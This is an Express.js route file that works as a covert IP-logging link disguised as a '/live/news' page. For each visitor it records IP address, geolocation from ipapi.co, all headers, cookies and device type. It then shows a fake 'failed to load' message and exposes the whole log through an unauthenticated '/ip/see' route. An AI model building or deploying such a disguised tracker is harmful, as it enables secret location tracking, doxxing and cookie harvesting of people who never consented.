const express = require("express");
const axios = require("axios");
const IpAddress = require("../models/idAddress");
const router = express.Router();

// Function to get device type from User-Agent
function getDeviceType(userAgent) {
  if (!userAgent) return "Unknown";

  userAgent = userAgent.toLowerCase();
  if (userAgent.includes("mobile")) return "Mobile";
  if (userAgent.includes("tablet")) return "Tablet";
  if (userAgent.includes("desktop")) return "Desktop";
  if (userAgent.includes("bot")) return "Bot";

  return "Unknown";
}

// Function to get GeoLocation from IP
async function getGeoLocation(ipAddress) {
  try {
    if (ipAddress === "127.0.0.1" || ipAddress === "::1") {
      return {
        country: "Localhost",
        region: "-",
        city: "-",
        latitude: 0,
        longitude: 0,
      };
    }

    const response = await axios.get(`https://ipapi.co/${ipAddress}/json/`);
    const data = response.data;

    return {
      fullData: data,
      country: data.country_name || "",
      region: data.region || "",
      city: data.city || "",
      latitude: data.latitude || 0,
      longitude: data.longitude || 0,
    };
  } catch (error) {
    console.error("GeoLocation lookup failed:", error);
    return { country: "", region: "", city: "", latitude: 0, longitude: 0 };
  }
}

// Route to log clicks with hybrid location
router.get("/live/news", async (req, res) => {
  try {
    const ipAddress =
      req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const { preciseLocation } = req.body; // Get precise location if sent from the browser

    const location = preciseLocation || (await getGeoLocation(ipAddress));

    const log = new IpAddress({
      eventName: "Link Click",
      ipAddress: ipAddress,
      userAgent: req.headers["user-agent"],
      routeAccessed: req.originalUrl,
      requestMethod: req.method,
      referrer: req.headers["referer"] || req.headers["referrer"],
      headers: req.headers,
      queryParams: req.query,
      cookies: req.cookies || {},
      deviceType: getDeviceType(req.headers["user-agent"]),
      geoLocation: location,
    });

    await log.save();
    res.status(200).send("failed to load");
  } catch (err) {
    console.log("Error in log:", err);
    res.status(500).send("Internal server error");
  }
});

// Route to view logs
router.get("/ip/see", async (req, res) => {
  try {
    const data = await IpAddress.find();
    res.json({ message: "Log entry details:", data });
  } catch (err) {
    console.log("Error in log:", err);
    res.status(500).send("Internal server error");
  }
});

module.exports = router;

// Now, if the browser sends precise location, it'll log that.
// Otherwise, it falls back to IP-based location! 🚀
